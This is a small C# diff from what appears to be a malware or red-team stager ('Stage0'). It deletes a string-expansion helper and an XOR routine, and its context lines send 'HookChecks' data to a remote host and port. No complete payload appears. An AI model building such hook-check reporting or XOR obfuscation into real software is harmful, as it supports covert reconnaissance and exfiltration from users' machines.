@@ -91,27 +91,6 @@ namespace Stage0
             SendData(_host, Convert.ToInt32(_port), HookChecks);
         }
 
-        public static string ExpandString(string str, int length)
-        {
-            var result = new StringBuilder(length, length);
-            var whole = length / str.Length;
-            for (var i = 0; i < whole; i++)
-            {
-                result.Append(str);
-            }
-            result.Append(str, 0, length % str.Length);
-            return result.ToString();
-        }
-
-        public static byte[] exclusiveOR(byte[] key, byte[] str)
-        {
-            for (int i = 0; i < str.Length; i++)
-            {
-                str[i] = (byte)(str[i] ^ key[i]);
-            }
-            return str;
-        }
-
         static void SendData(string server, int port, byte[] message)
         {
             try
